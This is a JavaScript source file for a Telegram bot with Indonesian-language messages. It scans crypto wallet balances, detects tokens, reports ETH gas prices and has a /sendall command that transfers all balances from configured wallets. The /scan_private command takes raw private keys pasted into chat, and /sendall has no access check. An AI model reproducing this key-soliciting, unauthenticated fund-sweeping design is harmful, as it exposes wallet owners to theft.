require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const { scanTokens, detectTokenName } = require('./utils/token_scanner');
const { getEthGasPrice } = require('./utils/gas_checker');
const { autoSendAllWallets } = require('./utils/auto_sender');
const config = require('./wallets.json');
const Web3 = require('web3');

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, "Selamat datang!\n\nPerintah:\n/scan_address [alamat]\n/scan_private [privatekey]\n/token [contract_address]\n/gas\n/sendall");
});

bot.onText(/\/scan_address (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const address = match[1].trim();

  bot.sendMessage(chatId, `\u{1F50D} Scanning alamat: ${address}...`);

  const tokens = await scanTokens(address);

  if (!tokens.length) {
    bot.sendMessage(chatId, `Tidak ada token di alamat ${address}.`);
    return;
  }

  let result = `\u{1F4B0} Hasil Scan untuk ${address}:\n`;
  tokens.forEach(token => {
    result += `\n• Jaringan: ${token.chain.toUpperCase()}\n• Token: ${token.token}\n• Saldo: ${token.balance}\n`;
  });

  bot.sendMessage(chatId, result);
});

bot.onText(/\/scan_private (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const privateKey = match[1].trim();

  try {
    const account = new Web3().eth.accounts.privateKeyToAccount(privateKey);
    const address = account.address;

    bot.sendMessage(chatId, `\u{2705} Private key valid.\nAlamat: ${address}\nMulai scan...`);

    const tokens = await scanTokens(address);

    if (!tokens.length) {
      bot.sendMessage(chatId, `Tidak ada token di alamat ${address}.`);
      return;
    }

    let result = `\u{1F4B0} Hasil Scan untuk ${address}:\n`;
    tokens.forEach(token => {
      result += `\n• Jaringan: ${token.chain.toUpperCase()}\n• Token: ${token.token}\n• Saldo: ${token.balance}\n`;
    });

    bot.sendMessage(chatId, result);

  } catch (error) {
    bot.sendMessage(chatId, "\u{274C} Private key tidak valid.");
  }
});

bot.onText(/\/token (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const contractAddress = match[1].trim();

  bot.sendMessage(chatId, `\u{1F50D} Mendeteksi token dari kontrak: ${contractAddress}...`);

  const result = await detectTokenName(contractAddress);

  if (result) {
    bot.sendMessage(chatId, `\u{1F4B0} Token terdeteksi:\n\n• Nama: ${result.name}\n• Jaringan: ${result.chain.toUpperCase()}`);
  } else {
    bot.sendMessage(chatId, "\u{274C} Token tidak ditemukan atau kontrak tidak valid.");
  }
});

bot.onText(/\/gas/, async (msg) => {
  const chatId = msg.chat.id;
  const gas = await getEthGasPrice();

  if (gas) {
    bot.sendMessage(chatId, `\u{26FD} Harga Gas ETH sekarang:\n\n• Cepat: ${gas.fast} Gwei\n• Normal: ${gas.average} Gwei\n• Murah: ${gas.safeLow} Gwei`);
  } else {
    bot.sendMessage(chatId, "\u{274C} Gagal mengambil data harga gas.");
  }
});

bot.onText(/\/sendall/, async (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, "\u{1F680} Mengirim semua saldo wallet...");

  await autoSendAllWallets();

  bot.sendMessage(chatId, "\u{2705} Semua saldo sudah diproses pengiriman!");
});
